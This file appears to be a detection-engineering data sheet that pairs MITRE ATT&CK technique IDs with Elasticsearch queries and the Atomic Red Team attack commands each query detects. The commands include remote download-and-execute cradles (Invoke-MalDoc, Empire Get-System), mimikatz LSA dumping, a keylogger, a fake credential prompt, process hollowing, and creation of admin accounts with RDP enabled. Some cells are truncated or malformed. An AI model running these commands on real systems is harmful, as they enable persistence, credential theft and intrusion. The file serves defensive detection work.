T1037.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                            {""match"":{""CommandLine"": ""Environment""}},                                                           
                            {""match_phrase"":{""CommandLine"": ""REG.exe ADD""}}, 
                             {""wildcard"":{""CommandLine"": ""*.bat""}},                 
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","echo ""echo Art ""Logon Script"" atomic test was successful. 
>> %USERPROFILE%\desktop\T1037.001-log.txt"" 
> %temp%\art.bat && REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d ""%temp%\art.bat"" /f",2,,
T1040,"{
    ""query"": {
        ""bool"": {
            ""must"": [
               
                {""match_phrase"": {""CommandLine"": ""tshark.exe""}},
                 {""match_phrase"": {""CommandLine"": ""Ethernet""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","""c:\Program Files\Wireshark\tshark.exe"" -i Ethernet -c 5",2,,
T1040,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match_phrase"": {""CommandLine"": ""netsh trace start""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",netsh trace start capture=yes tracefile=%temp%\trace.etl maxsize=10,2,,
T1053.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
               
                {""match"": {""CommandLine"": ""at""}},
                 {""match"": {""CommandLine"": ""interactive""}},
                 {""match"": {""CommandLine"": ""cmd""}},
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",at 13:20 /interactive cmd,2,,
T1053.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                        {""match_phrase"": {""CommandLine"": ""Register-ScheduledTask""}},
                         {""match"": {""CommandLine"": ""Highest""}},
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$Action = New-ScheduledTaskAction -Execute ""calc.exe""; 
$Trigger = New-ScheduledTaskTrigger -AtLogon; 
$User = New-ScheduledTaskPrincipal -GroupId ""BUILTIN\Administrators"" -RunLevel Highest; 
$Set = New-ScheduledTaskSettingsSet; 
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set;
Register-ScheduledTask AtomicTask -InputObject $object",2,,
T1053.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match_phrase"": {""CommandLine"": ""reg add""}},
                  {""match_phrase"": {""CommandLine"": "" schtasks.exe""}},
                {""wildcard"": {""CommandLine"": ""powershell*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f 
&& schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" 
powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st 07:45",2,,
T1053.005,"
{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                  {""wildcard"":{""CommandLine"": ""schtasks*""}}        
                ]
     }
    },
    {""bool"":{
     ""should"":[ 
                {""match"": {""CommandLine"": ""onlogon""}},
                {""match"": {""CommandLine"": ""onstart""}}
                     ]
     }
    }
                 ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","schtasks /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" 
&& schtasks /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""",2,,
T1053.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""SCHTASKS*""}},
                {""match"": {""CommandLine"": ""spawn""}},
                {""match"": {""CommandLine"": ""/ST""}},
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10,2,,
T1053.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                                 {""match_phrase"": {""CommandLine"": ""Invoke-MalDoc""}},
                                 {""match_phrase"": {""CommandLine"": ""-macroFile""}},
                                 {""match_phrase"": {""CommandLine"": ""Scheduler""}},


            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) ; 
Invoke-MalDoc -macroFile ""PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt"" -officeProduct ""Word"" -sub ""Scheduler""",,,
T1053.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                                 {""match_phrase"": {""CommandLine"":""Invoke-CimMethod""}},
                                 {""match_phrase"": {""CommandLine"":""Microsoft\\Windows\\TaskScheduler""}},
                                   {""wildcard"": {""CommandLine"":""*.xml""}},
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$xml = [System.IO.File]::ReadAllText(""PathToAtomicsFolder\T1053.005\src\T1053_005_WMI.xml""); 
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace ""Root\Microsoft\Windows\TaskScheduler"" -MethodName ""RegisterByXml"" -Arguments @{ Force = $true; Xml =$xml; }",2,,
T1055,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""wildcard"": {""CommandLine"": ""PsExec*""}},
                 {""match"": {""CommandLine"": ""inject""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","C:\PSTools\PsExec.exe /accepteula \\DC1 -c %tmp%\mimikatz\x64\mimikatz.exe ""lsadump::lsa /inject /id:500"" ""exit""",2,,
T1055,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match_phrase"": {""CommandLine"": "" Invoke-Maldoc""}},
                   {""match"": {""CommandLine"": ""Execute""}},
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing); 
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt"" -officeProduct ""Word"" -sub ""Execute""",2,,
T1055.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match_phrase"": {""CommandLine"": ""Invoke-WebRequest""}},
                 
                    ]
     }
    },
    {""bool"":{
     ""must"":[
                   {""match"": {""CommandLine"": ""INJECTRUNNING""}},
                {""match"": {""CommandLine"": ""mavinject""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",$mypid =; mavinject $mypid /INJECTRUNNING,与T1056.004混淆,,
T1055.012,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match"": {""CommandLine"": ""-Sponsor""}},
                 {""match"": {""CommandLine"": ""-Hollow""}},
                  {""match"": {""CommandLine"": ""-ParentPID""}},
                {""match_phrase"": {""CommandLine"": ""Start-Hollow""}},
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",". cd6d01_Start-Hollow.ps1;
$ppid=Get-Process explorer | select -expand id; 
Start-Hollow -Sponsor ""C:\Windows\System32\notepad.exe"" -Hollow ""C:\Windows\System32\cmd.exe"" -ParentPID $ppid -Verbose",2,,
T1055.012,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match_phrase"": {""CommandLine"": ""Invoke-MalDoc""}},
                  {""match"": {""CommandLine"": ""Exploit""}},          
                        ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) ; 
Invoke-MalDoc -macroFile ""PathToAtomicsFolder\T1055.012\src\T1055.012-macrocode.txt"" -officeProduct ""Word"" -sub ""Exploit""",2,,
T1056.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match_phrase"": {""CommandLine"": ""Set-Location""}},
                {""match"": {""CommandLine"": ""-LogPath""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",Set-Location $PathToAtomicsFolder; .\T1056.001\src\Get-Keystrokes.ps1 -LogPath $env:TEMP\key.log,,,
T1056.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""wildcard"": {""CommandLine"": ""*UI.PromptForCredential""}},
                {""wildcard"": {""CommandLine"": ""*GetNetworkCredential""}},
                 {""match"": {""CommandLine"": ""Password""}}
          ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName); write-warning $cred.GetNetworkCredential().Password",2,,
T1056.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""mavinject""}},
                 {""match"": {""CommandLine"": ""INJECTRUNNING""}},
                 {""match_phrase"": {""CommandLine"": ""Invoke-WebRequest""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",mavinject $pid /INJECTRUNNING; Invoke-WebRequest,2,,
T1072,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Radmin.*""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","if not exist ""%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe""  ( call ) ELSE ( echo Downloading radmin installer && bitsadmin /transfer myDownloadJob /download /priority normal ""r.msi"" /qn ) &&   &&  ""%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe""",2,,
T1078.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""net*""}}, 
              {""match"": {""CommandLine"": ""guest""}} ,
                {""match"": {""CommandLine"": ""user""}} 
                                ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",net user guest /active:yes,2,,
T1078.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""wildcard"": {""CommandLine"": ""net *""}},
                  {""wildcard"": {""CommandLine"": ""user""}},
                 {""wildcard"": {""CommandLine"": ""reg *""}},
                 {""wildcard"": {""CommandLine"": ""add""}},
                 {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Control\\Terminal Server""}},
                {""match"": {""CommandLine"": ""localgroup""}}
                           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","net user #{guest_user} /active:yes 
&& net user #{guest_user} #{guest_password} 
&& net localgroup #{local_admin_group} #{guest_user} /add 
&& net localgroup ""#{remote_desktop_users_group_name}"" #{guest_user} /add 
&& reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
&& reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v ""AllowTSConnections"" /t REG_DWORD /d 0x1 /f",,,
T1078.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match"": {""CommandLine"": ""/add""}},
                          {""wildcard"": {""CommandLine"": ""net*""}}
                    ]
     }
    },
               {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": ""/domain""}},
                         {""match"": {""CommandLine"": ""/active""}},
                    ]
     }
    },
    {""bool"": {
                    ""should"":[
                        {""match"": {""CommandLine"": ""user""}},
                        {""match"": {""CommandLine"": ""administrators""}}
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","net user art-test /add 
&& net user art-test Password123! 
&& net localgroup administrators art-test /add",2,,
T1091,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match_phrase"": {""CommandLine"": "" Win32_LogicalDisk""}},
                {""match_phrase"": {""CommandLine"": ""drivetype=2""}},
                 {""match_phrase"": {""CommandLine"": ""DeviceID""}}        
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$RemovableDrives=@(); $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter ""drivetype=2"" | select-object -expandproperty DeviceID; 
ForEach ($Drive in $RemovableDrives); 
{; write-host ""Removable Drive Found:"" $Drive; 
New-Item -Path $Drive/T1091Test1.txt -ItemType ""file"" -Force -Value ""T1091 Test 1 has created this file to simulate malware spread to removable drives.""; }",2,,
T1133,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                
                {""match_phrase"": {""CommandLine"": ""Start chrome""}}, 
            {""match_phrase"": {""CommandLine"": ""Stop-Process""}}
           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$extList = ""fcfhplploccackoneaefokcmbjfbkenj"", ""fdcgdnkidjaadafnichfpabhfomcebme""; 
foreach ($extension in $extList) {;   New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force;  
New-ItemProperty -Path ""HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension"" -Name ""update_url"" -Value ""https://clients2.google.com/service/update2/crx"" -PropertyType ""String"" -Force}; 
Start chrome; Start-Sleep -Seconds 30; Stop-Process -Name ""chrome""",2,,
T1134.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match"": {""CommandLine"": ""-Technique""}},
                  {""match"": {""CommandLine"": ""NamedPipe""}},
                  {""match"": {""CommandLine"": ""-Verbose""}},
                 {""match_phrase"": {""CommandLine"": ""Get-System""}}        
                        ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
 IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); 
Get-System -Technique NamedPipe -Verbose",2,,
T1134.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match_phrase"": {""CommandLine"": ""Set-ExecutionPolicy""}},
                  {""match_phrase"": {""CommandLine"": ""Get-Process""}},
                   {""match_phrase"": {""CommandLine"": ""Select ProcessName""}},
                {""match_phrase"": {""CommandLine"": ""CreateProcessFromParent""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","Set-ExecutionPolicy -Scope Process Bypass -Force; 
$owners = @{}; gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}; 
Get-Process | Select ProcessName,Id,@{l=""Owner"";e={$owners[$_.id.tostring()]}}; 
$PathToAtomicsFolder\T1134.002\src\GetToken.ps1; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,""cmd.exe"")",2,,
T1134.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                        {""match_phrase"": {""CommandLine"": ""Start-ATHProcessUnderSpecificParent""}},
                         {""match_phrase"": {""CommandLine"": ""System32\\WindowsPowerShell\\v1.0\\powershell.exe""}},
                        {""match"": {""CommandLine"": ""AtomicTestHarnesses""}},
                       {""match"": {""CommandLine"": ""-ParentId""}}
           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; 
if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  
Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe -CommandLine '-Command Start-Sleep 10' -ParentId $PID",2,,
T1134.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                             {""match_phrase"": {""CommandLine"": ""Start-ATHProcessUnderSpecificParent""}},
                             {""match"": {""CommandLine"": "" AtomicTestHarnesses""}},
                              {""match"": {""CommandLine"": ""-TestGuid""}},
                             {""match"": {""CommandLine"": ""-ParentId""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Start-ATHProcessUnderSpecificParent  -ParentId $PID -TestGuid 12345678-1234-1234-1234-123456789123,2,,
T1134.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Program Files\\Internet Explorer\\iexplore.exe""}},           
                {""wildcard"": {""CommandLine"": ""*ps1""}},
                  {""wildcard"": {""CommandLine"": ""*dll""}} 


           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",". 124a70_PPID-Spoof.ps1; $ppid=Get-Process explorer | select -expand id; 
PPID-Spoof -ppid $ppid -spawnto ""C:\Program Files\Internet Explorer\iexplore.exe"" -dllpath ""8b38ee_calc.dll""",2,,
T1197,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""set""}},    
                 {""wildcard"": {""CommandLine"": ""desktopimgdownldr*""}},
                {""match"": {""CommandLine"": ""cmd""}} 
        ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","set ""SYSTEMROOT=C:\Windows\Temp"" && cmd /c desktopimgdownldr.exe
/lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr",2,,
T1497.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""*.clear""}},
                {""match_phrase"": {""CommandLine"": ""Get-WmiObject""}},
                {""match"": {""CommandLine"": ""SELECT""}}  
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$error.clear(); 
Get-WmiObject -Query ""SELECT * FROM MSAcpi_ThermalZoneTemperature"" -ErrorAction SilentlyContinue; 
if($error) {echo ""Virtualization Environment detected""}",2,,
T1497.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""*ToLower""}},
                         {""wildcard"": {""CommandLine"": ""*contains""}},
                         {""match"": {""CommandLine"": ""Manufacturer""}}
                    ]
     }
    },
    {""bool"": {
                    ""should"":[
                        {""match"": {""CommandLine"": ""virtual""}},
                        {""match"": {""CommandLine"": ""vmware""}},
                        {""match"": {""CommandLine"": ""virtualbox""}},
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty ""Manufacturer""; 
$Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty ""Model""; 
if((($Manufacturer.ToLower() -eq ""microsoft corporation"") -and ($Model.ToLower().contains(""virtual""))) -or ($Manufacturer.ToLower().contains(""vmware"")) -or ($Model.ToLower() -eq ""virtualbox"")) {write-host ""Virtualization environment detected!""} else {write-host ""No virtualization environment detected!""}",2,,
